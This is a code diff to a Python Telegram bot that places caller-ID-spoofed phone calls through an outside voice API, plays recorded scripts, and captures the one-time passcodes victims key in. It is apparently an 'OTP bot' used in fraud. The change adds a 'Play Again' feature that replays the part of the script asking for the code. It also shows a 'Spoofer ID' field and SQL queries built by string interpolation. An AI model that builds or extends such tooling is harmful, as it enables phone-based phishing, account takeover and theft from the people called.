@@ -36,6 +36,7 @@ last_message_ids = {}
 ringing_handler = []
 recording_handler = {}
 last_accept_deny = {}
+playback_handler = {}
 
 
 updater = Updater(token=bot_tkn, use_context=True)
@@ -768,7 +769,38 @@ def Set_custogrem_script(message):
  
 
 #------------------------------------------------------------------------------------------------------------------
+def play_script_again(chatid):
+    global playback_handler
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor()
 
+    c.execute(f"Select * from users where user_id={chatid}")
+    sc_id1 = c.fetchone()
+    customscid1 = sc_id1[6]
+
+    c.execute(f"Select * from call_data where chat_id={chatid}")
+    custom_cont1 = c.fetchone()
+    call_control_id1  = custom_cont1[1]
+    
+    c.execute(f"select * from custom_scripts where script_id='{customscid1}' limit 1")
+    custom_sc_src1 = c.fetchone()
+    digits = custom_sc_src1[8]
+    nospace_digits1= "".join(digits.split())
+    
+    playback_handler[str(chatid)]=0
+    url3 = 'https://articunoapi.com:8443/gather-audio'
+    data = {
+    "uuid": f"{call_control_id1}",
+    "audiourl": f"https://sourceotp.online/scripts/{customscid1}/output2.wav",
+    "maxdigits": f"{nospace_digits1}",
+    
+}
+    requests.post(url3, json=data)
+    c.close()
+
+
+
+     
 
 
 def retrive_recording(rec_url,chatid):
@@ -967,6 +999,7 @@ def custom_prebuild_script_call(script_id,chatid):
     global ringing_handler 
     global recording_handler
     global last_accept_deny
+    global playback_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1006,7 +1039,15 @@ def custom_prebuild_script_call(script_id,chatid):
                 db.commit()
             except:
                  print("Recording Error")
-            
+
+    elif event == 'playback.finished':
+         if playback_handler[str(chatid)] == 1:
+              keyboard = types.InlineKeyboardMarkup(row_width=1)
+              item = types.InlineKeyboardButton(text="🔊Play Again🔂",callback_data="/repeat_audio")
+              keyboard.add(item)
+              mesid1 = bot.send_message(chatid,f"""Repeat otp script (part 2) again.""",reply_markup=keyboard, parse_mode='HTML').message_id
+              last_message_ids[chatid]=mesid1
+         
 
     elif event == "call.complete":
             global last_message_ids
@@ -1027,6 +1068,7 @@ def custom_prebuild_script_call(script_id,chatid):
             except:
                  print("error in sending Recording")
 
+
     elif event == "dtmf.entered":
         data = request.get_json()
         digit =  data['digit']
@@ -1037,6 +1079,7 @@ def custom_prebuild_script_call(script_id,chatid):
         otp2 = data['digits']
 
         if otp2 == "1":
+            playback_handler[str(chatid)] = 1
             def custom_ask_otp():
                 url3 = 'https://articunoapi.com:8443/gather-audio'
                 data = {
@@ -1316,8 +1359,8 @@ def make_call_custon(message):
 ┏━━⚇
 ┃<b>Call Details</b> 🤳 
 ┗━━━━━━━━✺
-<b>[📞] Spoofer ID »»</b><code>{spoof}</code> 
-<b>[☎️] Calling To »»</b><code>{number}</code>
+<b>[📞] Spoofer ID »»</b><code>{number}</code> 
+<b>[☎️] Calling To »»</b><code>{spoof}</code>
 <b>[📝] Script ID »»</b> <code>{script_id}</code>
 <b>[🧏]Voice »»</b><code>{voice}</code>
 """,parse_mode='HTML')
@@ -1380,8 +1423,8 @@ def make_call_custon(message):
 ┏━━⚇
 ┃<b>Call Details</b> 🤳 
 ┗━━━━━━━━✺
-<b>[📞] Spoofer ID »»</b><code>{spoof}</code> 
 <b>[☎️] Calling To »»</b><code>{number}</code>
+<b>[📞] Spoofer ID »»</b><code>{spoof}</code> 
 <b>[📝] Script ID »»</b> <code>{script_id}</code>
 <b>[🧏]Voice »»</b><code>{voice}</code>
 """,parse_mode='HTML')
@@ -1499,10 +1542,9 @@ def handle_callback(message):
             aplha_confirm1(message,"Deny")
 
 
-            
-         
-         
-         
+    elif message.data == '/repeat_audio':
+            bot.edit_message_reply_markup(chat_id=message.from_user.id, message_id=last_message_ids[message.from_user.id],text="🔊Playing script again🔂", reply_markup=None)
+            play_script_again(message.from_user.id)
 
     elif message.data =='/ind':
         keyboard = types.InlineKeyboardMarkup(row_width=2)
